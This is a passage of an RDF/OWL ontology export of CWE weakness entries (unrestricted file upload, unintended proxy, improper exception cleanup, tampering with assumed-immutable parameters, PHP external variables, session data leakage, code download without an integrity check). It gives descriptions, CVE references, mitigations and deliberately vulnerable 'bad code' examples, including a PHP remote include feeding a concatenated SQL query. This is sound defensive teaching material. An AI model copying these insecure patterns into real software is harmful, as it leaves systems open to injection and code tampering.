                 dynamic  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Fuzz Tester
- Framework-based Fuzzer
Effectiveness: SOAR Partial"^^xsd:string, 
                 rdfs:comment "Analysis with Manual Results Interpretation"^^xsd:string
                 
                 dynamic  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Do not rely exclusively on sanity checks of file contents to ensure that the file is of the expected type and size. It may be possible for an attacker to hide code in some file segments that will still be executed by the server. For example, GIF images may contain a free-form comments field."^^xsd:string, 
                 rdfs:comment "Do not rely exclusively on the MIME content type or filename attribute when determining how to render a file. Validating the MIME content type and ensuring that it matches the extension is only a partial solution."^^xsd:string, 
                 rdfs:comment "Strategy: Input Validation
Assume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.
When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"
Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
For example, limiting filenames to alphanumeric characters can help to restrict the introduction of unintended file extensions."^^xsd:string, 
                 rdfs:comment "Strategy: Input Validation
Ensure that only one extension is used in the filename. Some web servers, including some versions of Apache, may process files based on inner extensions so that \"filename.php.gif\" is fed to the PHP interpreter."^^xsd:string, 
                 rdfs:comment "When running on a web server that supports case-insensitive filenames, perform case-insensitive evaluations of the extensions that are provided."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "Sometimes Prevalent"^^xsd:string
                 
                 languages  "ASP.NET"^^xsd:string,
     
     Annotations: rdfs:comment "Often Prevalent"^^xsd:string
                 
                 languages  "PHP"^^xsd:string,
     likelihood_of_exploit  "Medium"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Environment Hardening
Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."^^xsd:string, 
                 rdfs:comment "Strategy: Sandbox or Jail
Run the code in a \"jail\" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.
OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.
This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.
Be careful to avoid CWE-243 and other weaknesses related to jails.
Effectiveness: Limited

Note: The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed."^^xsd:string
                 
                 operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Undetermined Prevalence"^^xsd:string
                 
                 paradigms  "Web Based"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
- Source code Weakness Analyzer
- Context-configured Source Code Weakness Analyzer
Effectiveness: High"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
- Focused Manual Spotcheck - Focused manual analysis of source
- Manual Source Code Review (not inspections)
Effectiveness: High"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "Sometimes Prevalent"^^xsd:string
                 
                 technologies  "Web Server"^^xsd:string,
     
     Annotations: rdfs:comment "This can be primary when there is no check at all. (where the weakness is a quality issue that might indirectly make it easier to introduce security-relevant weaknesses or make them more difficult to detect)"^^xsd:string
                 
                 weakness_ordinalities  "Primary"^^xsd:string,
     
     Annotations: rdfs:comment "This can be resultant from client-side enforcement (CWE-602); some products will include web script in web clients to check the filename, without verifying on the server side. (where the weakness is a quality issue that might indirectly make it easier to introduce security-relevant weaknesses or make them more difficult to detect)"^^xsd:string, 
                 rdfs:comment "This is frequently resultant when use of double extensions (e.g. \".php.gif\") bypasses a sanity check. (where the weakness is a quality issue that might indirectly make it easier to introduce security-relevant weaknesses or make them more difficult to detect)"^^xsd:string
                 
                 weakness_ordinalities  "Resultant"^^xsd:string
    
    
Individual: CWE-441_Unintended_Proxy_or_Intermediary

    Annotations: 
        rdfs:comment "Alternate Terms:
Confused Deputy:	
This weakness is sometimes referred to as the \"Confused deputy\" problem, in which an attacker misused the authority of one victim (the \"confused deputy\") when targeting another victim."^^xsd:string,
        rdfs:comment "If an attacker cannot directly contact a target, but the software has access to the target, then the attacker can send a request to the software and have it be forwarded from the target. The request would appear to be coming from the software's system, not the attacker's system. As a result, the attacker can bypass access controls (such as firewalls) or hide the source of malicious requests, since the requests would not be coming directly from the attacker.

Since proxy functionality and message-forwarding often serve a legitimate purpose, this issue only becomes a vulnerability when:
 - The software runs with different privileges or on a different system, or otherwise has different levels of access than the upstream component;
 - The attacker is prevented from making the request directly to the target; and
 - The attacker can create a request that the proxy does not explicitly intend to be forwarded on the behalf of the requester. Such a request might point to an unexpected hostname, port number, or service. Or, the request might be sent to an allowed service, but the request could contain disallowed directives, commands, or resources."^^xsd:string,
        rdfs:comment "Maintenance: 
This could possibly be considered as an emergent resource."^^xsd:string,
        rdfs:comment "Relationship:
This weakness has a chaining relationship with CWE-668 (Exposure of Resource to Wrong Sphere) because the proxy effectively provides the attacker with access to the target's resources that the attacker cannot directly obtain."^^xsd:string,
        rdfs:comment "The software receives a request, message, or directive from an upstream component, but the software does not sufficiently preserve the original source of the request before forwarding the request to an external actor that is outside of the software's control sphere. This causes the software to appear to be the source of the request, leading it to act as a proxy or other intermediary between the upstream component and the external actor."^^xsd:string,
        rdfs:comment "Theoretical:
It could be argued that the \"confused deputy\" is a fundamental aspect of most vulnerabilities that require an active attacker. Even for common implementation issues such as buffer overflows, SQL injection, OS command injection, and path traversal, the vulnerable program already has the authorization to run code or access files. The vulnerability arises when the attacker causes the program to run unexpected code or access unexpected files."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1014_Identify_Actors,
     
     Annotations: rdfs:comment "FTP bounce attack. The design of the protocol allows an attacker to modify the PORT command to cause the FTP server to connect to other machines besides the attacker's."^^xsd:string
                 
                 references  CVE-1999-0017,
     
     Annotations: rdfs:comment "RPC portmapper could redirect service requests from an attacker to another entity, which thinks the requests came from the portmapper."^^xsd:string
                 
                 references  CVE-1999-0168,
     
     Annotations: rdfs:comment "Bounce attack allows access to TFTP from trusted side."^^xsd:string
                 
                 references  CVE-2001-1484,
     
     Annotations: rdfs:comment "Web server allows attackers to request a URL from another server, including other ports, which allows proxied scanning."^^xsd:string
                 
                 references  CVE-2002-1484,
     
     Annotations: rdfs:comment "CGI script accepts and retrieves incoming URLs."^^xsd:string
                 
                 references  CVE-2004-2061,
     
     Annotations: rdfs:comment "FTP server does not ensure that the IP address in a PORT command is the same as the FTP user's session, allowing port scanning by proxy."^^xsd:string
                 
                 references  CVE-2005-0315,
     
     Annotations: rdfs:comment "URL-downloading library automatically follows redirects to file:// and scp:// URLs"^^xsd:string
                 
                 references  CVE-2009-0037,
     
     Annotations: rdfs:comment "Web-based mail program allows internal network scanning using a modified POP3 port number."^^xsd:string
                 
                 references  CVE-2010-1637,
     
     Annotations: rdfs:comment "Cache Poisoning"^^xsd:string
                 
                 related_attack_patterns  CAPEC-141,
     
     Annotations: rdfs:comment "DNS Cache Poisoning"^^xsd:string
                 
                 related_attack_patterns  CAPEC-142,
     
     Annotations: rdfs:comment "XML Routing Detour Attacks"^^xsd:string
                 
                 related_attack_patterns  CAPEC-219,
     
     Annotations: rdfs:comment "Transparent Proxy Abuse"^^xsd:string
                 
                 related_attack_patterns  CAPEC-465,
     ID  "441"^^xsd:positiveInteger,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     access_control  "Hide Activities"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Enforce the use of strong mutual authentication mechanism between the two parties."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     non-repudiation  "Gain Privileges or Assume Identity"^^xsd:string,
     non-repudiation  "Hide Activities"^^xsd:string
    
    
Individual: CWE-460_Improper_Cleanup_on_Thrown_Exception

    Annotations: 
        rdfs:comment "Often, when functions or loops become complicated, some level of resource cleanup is needed throughout execution. Exceptions can disturb the flow of the code and prevent the necessary cleanup from happening."^^xsd:string,
        rdfs:comment "The product does not clean up its state or incorrectly cleans up its state when an exception is thrown, leading to unexpected state or control flow."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1012_Cross_Cutting,
     ID  "460"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "The following example demonstrates the weakness.

Example Language: Java  /* (bad code) */
public class foo {
public static final void main( String args[] ) {

boolean returnValue;
returnValue=doStuff();
}
public static final boolean doStuff( ) {

boolean threadLock;
boolean truthvalue=true;
try {

while(
//check some condition 
) {

threadLock=true; //do some stuff to truthvalue
threadLock=false;
}
}
catch (Exception e){

System.err.println(\"You did something bad\");
if (something) return truthvalue;
}
return truthvalue;
}
}
In this case, you may leave a thread locked accidentally."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "If one breaks from a loop or function by throwing an exception, make sure that cleanup happens or that you should exit the program. Use throwing exceptions sparsely."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Undetermined Prevalence"^^xsd:string
                 
                 languages  "C"^^xsd:string,
     
     Annotations: rdfs:comment "Undetermined Prevalence"^^xsd:string
                 
                 languages  "C#"^^xsd:string,
     
     Annotations: rdfs:comment "Undetermined Prevalence"^^xsd:string
                 
                 languages  "C++"^^xsd:string,
     
     Annotations: rdfs:comment "Undetermined Prevalence"^^xsd:string
                 
                 languages  "Java"^^xsd:string,
     likelihood_of_exploit  "Medium"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "The code could be left in a bad state."^^xsd:string
                 
                 other  "Varies by Context"^^xsd:string
    
    
Individual: CWE-472_External_Control_of_Assumed-Immutable_Web_Parameter

    Annotations: 
        rdfs:comment "Alternate Terms:
Assumed-Immutable Parameter Tampering"^^xsd:string,
        rdfs:comment "If a web product does not properly protect assumed-immutable values from modification in hidden form fields, parameters, cookies, or URLs, this can lead to modification of critical data. Web applications often mistakenly make the assumption that data passed to the client in hidden fields or cookies is not susceptible to tampering. Improper validation of data that are user-controllable can lead to the application processing incorrect, and often malicious, input.

For example, custom cookies commonly store session data or persistent data across sessions. This kind of session data is normally involved in security related decisions on the server side, such as user authentication and access control. Thus, the cookies might contain sensitive data such as user credentials and privileges. This is a dangerous practice, as it can often lead to improper reliance on the value of the client-provided cookie by the server side application."^^xsd:string,
        rdfs:comment "Relationship:
This is a primary weakness for many other weaknesses and functional consequences, including XSS, SQL injection, path disclosure, and file inclusion."^^xsd:string,
        rdfs:comment "The web application does not sufficiently verify inputs that are assumed to be immutable but are actually externally controllable, such as hidden form fields."^^xsd:string,
        rdfs:comment "Theoretical:
This is a technology-specific MAID problem."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     
     Annotations: rdfs:comment "Shopping cart allows price modification via hidden form field."^^xsd:string
                 
                 references  CVE-2000-0101,
     
     Annotations: rdfs:comment "Shopping cart allows price modification via hidden form field."^^xsd:string
                 
                 references  CVE-2000-0102,
     
     Annotations: rdfs:comment "Shopping cart allows price modification via hidden form field."^^xsd:string
                 
                 references  CVE-2000-0253,
     
     Annotations: rdfs:comment "Shopping cart allows price modification via hidden form field."^^xsd:string
                 
                 references  CVE-2000-0254,
     
     Annotations: rdfs:comment "Allows admin access by modifying value of form field."^^xsd:string
                 
                 references  CVE-2000-0758,
     
     Annotations: rdfs:comment "Shopping cart allows price modification via hidden form field."^^xsd:string
                 
                 references  CVE-2000-0926,
     
     Annotations: rdfs:comment "Send email to arbitrary users by modifying email parameter."^^xsd:string
                 
                 references  CVE-2000-1234,
     
     Annotations: rdfs:comment "Forum product allows spoofed messages of other users via hidden form fields for name and e-mail address."^^xsd:string
                 
                 references  CVE-2002-0108,
     
     Annotations: rdfs:comment "Read messages by modifying message ID parameter."^^xsd:string
                 
                 references  CVE-2002-1880,
     
     Annotations: rdfs:comment "Authentication bypass by setting a parameter."^^xsd:string
                 
                 references  CVE-2005-1652,
     
     Annotations: rdfs:comment "Modification of message number parameter allows attackers to read other people's messages."^^xsd:string
                 
                 references  CVE-2005-1682,
     
     Annotations: rdfs:comment "Product does not check authorization for configuration change admin script, leading to password theft via modified e-mail address field."^^xsd:string
                 
                 references  CVE-2005-1784,
     
     Annotations: rdfs:comment "Logic error leads to password disclosure."^^xsd:string
                 
                 references  CVE-2005-2314,
     
     Annotations: rdfs:comment "XML Schema Poisoning"^^xsd:string
                 
                 related_attack_patterns  CAPEC-146,
     
     Annotations: rdfs:comment "Schema Poisoning"^^xsd:string
                 
                 related_attack_patterns  CAPEC-271,
     
     Annotations: rdfs:comment "Accessing/Intercepting/Modifying HTTP Cookies"^^xsd:string
                 
                 related_attack_patterns  CAPEC-31,
     
     Annotations: rdfs:comment "Manipulating Opaque Client-based Data Tokens"^^xsd:string
                 
                 related_attack_patterns  CAPEC-39,
     ID  "472"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
In this example, a web application uses the value of a hidden form field (accountID) without having done any input validation because it was assumed to be immutable.

(bad code)
Example Language: Java 
String accountID = request.getParameter(\"accountID\");
User user = getUserFromID(Long.parseLong(accountID));"^^xsd:string, 
                 rdfs:comment "Example 2
Hidden fields should not be trusted as secure parameters.

An attacker can intercept and alter hidden fields in a post to the server as easily as user input fields. An attacker can simply parse the HTML for the substring:

(bad code)
Example Language: HTML 
<input type=\"hidden\"
or even just \"hidden\". Hidden field values displayed later in the session, such as on the following page, can open a site up to cross-site scripting attacks."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string, 
                 rdfs:comment "Strategy: Input Validation

Assume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.
When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"
Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright."^^xsd:string, 
                 rdfs:comment "Strategy: Input Validation

Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Without appropriate protection mechanisms, the client can easily tamper with cookies and similar web data. Reliance on the cookies without detailed validation can lead to problems such as SQL injection. If you use cookie values for security related decisions on the server side, manipulating the cookies might lead to violations of security policies such as authentication bypassing, user impersonation and privilege escalation. In addition, storing sensitive data in the cookie without appropriate protection can also lead to disclosure of sensitive user data, especially data stored in persistent cookies."^^xsd:string
                 
                 integrity  "Modify Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-473_PHP_External_Variable_Modification

    Annotations: 
        rdfs:comment "A PHP application does not properly protect against the modification of variables from external sources, such as query parameters or cookies. This can expose the application to numerous weaknesses that would not exist otherwise."^^xsd:string,
        rdfs:comment "Relationship:
This is a language-specific instance of Modification of Assumed-Immutable Data (MAID). This can be resultant from direct request (alternate path) issues. It can be primary to weaknesses such as PHP file inclusion, SQL injection, XSS, authentication bypass, and others."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     references  CVE-2000-0860,
     references  CVE-2001-0854,
     references  CVE-2001-1025,
     references  CVE-2002-0764,
     references  CVE-2003-0754,
     related_attack_patterns  CAPEC-77,
     ID  "473"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Carefully identify which variables can be controlled or influenced by an external user, and consider adopting a naming convention to emphasize when externally modifiable variables are being used. An application should be reluctant to trust variables that have been initialized outside of its trust boundary. Ensure adequate checking is performed when relying on input from outside a trust boundary. Do not allow your application to run with register_globals enabled. If you implement a register_globals emulator, be extremely careful of variable extraction, dynamic evaluation, and similar issues, since weaknesses in your emulation could allow external variable modification to take place even without register_globals."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Modify Application Data"^^xsd:string,
     languages  "PHP"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Carefully identify which variables can be controlled or influenced by an external user, and consider adopting a naming convention to emphasize when externally modifiable variables are being used. An application should be reluctant to trust variables that have been initialized outside of its trust boundary. Ensure adequate checking is performed when relying on input from outside a trust boundary. Do not allow your application to run with register_globals enabled. If you implement a register_globals emulator, be extremely careful of variable extraction, dynamic evaluation, and similar issues, since weaknesses in your emulation could allow external variable modification to take place even without register_globals."^^xsd:string
                 
                 requirements  ""^^xsd:string
    
    
Individual: CWE-488_Exposure_of_Data_Element_to_Wrong_Session

    Annotations: 
        rdfs:comment "Data can \"bleed\" from one session to another through member variables of singleton objects, such as Servlets, and objects from a shared pool.

In the case of Servlets, developers sometimes do not understand that, unless a Servlet implements the SingleThreadModel interface, the Servlet is a singleton; there is only one instance of the Servlet, and that single instance is used and re-used to handle multiple requests that are processed simultaneously by different threads. A common result is that developers use Servlet member fields in such a way that one user may inadvertently see another user's data. In other words, storing user data in Servlet member fields introduces a data access race condition."^^xsd:string,
        rdfs:comment "The product does not sufficiently enforce boundaries between the states of different sessions, causing data to be provided to, or used by, the wrong session."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1018_Manage_User_Sessions,
     
     Annotations: rdfs:comment "Session Credential Falsification through Prediction"^^xsd:string
                 
                 related_attack_patterns  CAPEC-59,
     
     Annotations: rdfs:comment "Reusing Session IDs (aka Session Replay)"^^xsd:string
                 
                 related_attack_patterns  CAPEC-60,
     ID  "488"^^xsd:positiveInteger
    
    
Individual: CWE-494_Download_of_Code_Without_Integrity_Check

    Annotations: 
        rdfs:comment "An attacker can execute malicious code by compromising the host server, performing DNS spoofing, or modifying the code in transit."^^xsd:string,
        rdfs:comment "Research Gap:
This is critical for mobile code, but it is likely to become more and more common as developers continue to adopt automated, network-based product distributions and upgrades. Software-as-a-Service (SaaS) might introduce additional subtleties. Common exploitation scenarios may include ad server compromises and bad upgrades."^^xsd:string,
        rdfs:comment "The product downloads source code or an executable from a remote location and executes the code without sufficiently verifying the origin and integrity of the code."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1020_Verify_Message_Integrity,
     
     Annotations: rdfs:comment "anti-virus product does not verify automatic updates for itself."^^xsd:string
                 
                 references  CVE-2001-1125,
     
     Annotations: rdfs:comment "VOIP phone downloads applications from web sites without verifying integrity."^^xsd:string
                 
                 references  CVE-2002-0671,
     
     Annotations: rdfs:comment "online poker client does not verify authenticity of its own updates."^^xsd:string
                 
                 references  CVE-2008-3324,
     
     Annotations: rdfs:comment "OS does not verify authenticity of its own updates."^^xsd:string
                 
                 references  CVE-2008-3438,
     
     Annotations: rdfs:comment "Software Integrity Attackst"^^xsd:string
                 
                 related_attack_patterns  CAPEC-184,
     
     Annotations: rdfs:comment "Malicious Software Download"^^xsd:string
                 
                 related_attack_patterns  CAPEC-185,
     
     Annotations: rdfs:comment "Malicious Software Update"^^xsd:string
                 
                 related_attack_patterns  CAPEC-186,
     
     Annotations: rdfs:comment "Malicious Automated Software Update"^^xsd:string
                 
                 related_attack_patterns  CAPEC-187,
     related_attack_patterns  CAPEC-533,
     
     Annotations: rdfs:comment "Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.
Attach the monitor to the process and also sniff the network connection. Trigger features related to product updates or plugin installation, which is likely to force a code download. Monitor when files are downloaded and separately executed, or if they are otherwise read back into the process. Look for evidence of cryptographic library calls that use integrity checking."^^xsd:string
                 
                 Black_Box  ""^^xsd:string,
     ID  "494"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Encrypt the code with a reliable encryption scheme before transmitting.
This will only be a partial solution, since it will not detect DNS spoofing and it will not prevent your code from being modified on the hosting site."^^xsd:string, 
                 rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string, 
                 rdfs:comment "Strategy: Environment Hardening

Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations."^^xsd:string, 
                 rdfs:comment "Strategy: Libraries or Frameworks

Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
Speficially, it may be helpful to use tools or frameworks to perform integrity checking on the transmitted code.
 - When providing the code that is to be downloaded, such as for automatic updates of the software, then use cryptographic signatures for the code and modify the download clients to verify the signatures. Ensure that the implementation does not contain CWE-295, CWE-320, CWE-347, and related weaknesses.
 - Use code signing technologies such as Authenticode."^^xsd:string, 
                 rdfs:comment "Strategy: Sandbox or Jail

Run the code in a \"jail\" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.
OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.
This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.
Be careful to avoid CWE-243 and other weaknesses related to jails.
Effectiveness: Limited

Note: The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     availability  "Alter Execution Logic"^^xsd:string,
     availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     availability  "Other"^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "Executing untrusted code could compromise the control flow of the program. The untrusted code could execute attacker-controlled commands, read or modify sensitive resources, or prevent the software from functioning correctly for legitimate users."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Alter Execution Logic"^^xsd:string,
     confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     confidentiality  "Other"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1. This example loads an external class from a local subdirectory.

(bad code)
Example Language: Java 
URL[] classURLs= new URL[]{
new URL(\"file:subdir/\")
};
URLClassLoader loader = new URLClassLoader(classURLs);
Class loadedClass = Class.forName(\"loadMe\", true, loader);
This code does not ensure that the class loaded is the intended one, for example by verifying the class's checksum. An attacker may be able to modify the class file to execute malicious code."^^xsd:string, 
                 rdfs:comment "Example 2. This code includes an external script to get database credentials, then authenticates a user against the database, allowing access to the application.

(bad code)
Example Language: PHP 
//assume the password is already encrypted, avoiding CWE-312

function authenticate($username,$password){

include(\"http://external.example.com/dbInfo.php\");

//dbInfo.php makes $dbhost, $dbuser, $dbpass, $dbname available
mysql_connect($dbhost, $dbuser, $dbpass) or die ('Error connecting to mysql');
mysql_select_db($dbname);
$query = 'Select * from users where username='.$username.' And password='.$password;
$result = mysql_query($query);

if(mysql_numrows($result) == 1){
mysql_close();
return true;
}
else{
mysql_close();
return false;
}

}
This code does not verify that the external domain accessed is the intended one. An attacker may somehow cause the external domain name to resolve to an attack server, which would provide the information for a false database. The attacker may then steal the usernames and encrypted passwords from real user login attempts, or simply allow himself to access the application without a real user account.

This example is also vulnerable to a Man in the Middle (CWE-300) attack."^^xsd:string
